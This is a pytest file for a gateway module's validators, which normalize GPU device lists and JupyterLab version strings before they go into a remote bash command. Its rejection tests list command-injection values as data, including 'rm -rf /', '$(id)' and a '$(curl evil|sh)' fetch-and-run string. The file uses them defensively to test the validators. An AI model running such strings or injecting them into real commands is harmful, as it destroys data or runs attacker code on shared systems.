"""compute_vm — the pure bits of a VM Compute session (uv venv + JupyterLab).

`visible_devices` and the session's base path both end up inside a remote
`bash -lc` command line, so their validation/shape is worth pinning down here
rather than discovering on a shared GPU box.
"""
import pytest

from gateway.compute_vm import base_path, validate_jupyter_version, validate_visible_devices


@pytest.mark.parametrize("raw,expected", [
    ("0", "0"),
    ("0,1", "0,1"),
    (" 0, 1 ", "0,1"),        # spaces stripped
    ("0,0,2", "0,2"),         # deduped — CUDA_VISIBLE_DEVICES=0,0 is a real footgun
    ("", None),               # blank = don't set the variable at all
    ("   ", None),
    (None, None),
])
def test_visible_devices_normalized(raw, expected):
    assert validate_visible_devices(raw) == expected


@pytest.mark.parametrize("raw", [
    "0;rm -rf /",
    "$(curl evil|sh)",
    "0 1",          # space-separated is not CUDA's format
    "all",
    "gpu0",
    "0,",
    ",0",
    "-1",
])
def test_visible_devices_rejects_non_indices(raw):
    with pytest.raises(ValueError):
        validate_visible_devices(raw)


@pytest.mark.parametrize("raw,expected", [
    ("4.2.5", "4.2.5"),
    ("4", "4"),
    ("4.2", "4.2"),
    ("4.2.5rc1", "4.2.5rc1"),
    ("4.3.0.dev0", "4.3.0.dev0"),
    ("4.*", "4.*"),
    ("==4.2.5", "4.2.5"),   # a pasted pip spec's leading == is tolerated
    (" 4.2.5 ", "4.2.5"),
    ("", None),            # blank = latest
    (None, None),
])
def test_jupyter_version_normalized(raw, expected):
    assert validate_jupyter_version(raw) == expected


@pytest.mark.parametrize("raw", [
    ">=4,<5",              # a specifier, not a version — needs shell metachars
    "4.2.5; rm -rf /",
    "$(id)",
    "latest",
    "jupyterlab==4.2.5",   # the package name, not the version
    "4.2.5 --force",
])
def test_jupyter_version_rejects_specifiers_and_injection(raw):
    with pytest.raises(ValueError):
        validate_jupyter_version(raw)


def test_base_path_is_jupyter_shaped():
    # Jupyter requires base_url to have BOTH a leading and a trailing slash, and
    # the proxy relies on it matching the gateway route exactly (that's what
    # makes response rewriting unnecessary).
    p = base_path("cmp-abc123", "deadbeef")
    assert p == "/compute/jupyter/cmp-abc123/deadbeef/"
    assert p.startswith("/") and p.endswith("/")
